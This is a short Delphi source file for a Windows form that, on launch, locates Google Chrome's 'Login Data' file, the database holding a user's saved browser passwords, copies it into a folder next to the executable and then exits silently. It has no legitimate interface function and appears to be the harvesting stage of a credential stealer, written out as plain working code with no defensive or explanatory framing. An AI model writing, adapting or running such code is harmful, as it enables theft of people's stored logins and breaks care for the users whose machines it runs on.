unit Unit1;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms, Dialogs;

type
  TForm1 = class(TForm)
  procedure CopyDatabase(dir: string);
  procedure FormCreate(Sender: TObject);
  end;

var
  Form1: TForm1;

implementation

{$R *.dfm}

function GetWin(Comand: string): string;
var
  buff: array [0 .. $FF] of char;
begin
  ExpandEnvironmentStrings(PChar(Comand), buff, SizeOf(buff));
  Result := buff;
end;







procedure TForm1.FormCreate(Sender: TObject);
var
  A: string;
begin
  A := GetWin('%AppData%');
  A := StringReplace(A, '\Roaming', '', [rfReplaceAll]) + '\Local\Google\Chrome\User Data\Default\Login Data';
  if not FileExists(A) then ShowMessage('File Not Exists!')
    else
      begin
        CopyDatabase(A);
        ExitProcess(0);
      end;
end;



procedure TForm1.CopyDatabase(dir: string);
var
  NewDir: string;
  today : TDateTime;
begin
  NewDir := ExtractFilePath(Application.ExeName) + 'Data';
  if not DirectoryExists(NewDir) then ForceDirectories(NewDir);
  today := Now;
  NewDir := NewDir + '\data ' + formatdatetime('dd/mm/yy/ss', today);
  CopyFile(PChar(dir),PChar(NewDir),false);
end;


end.
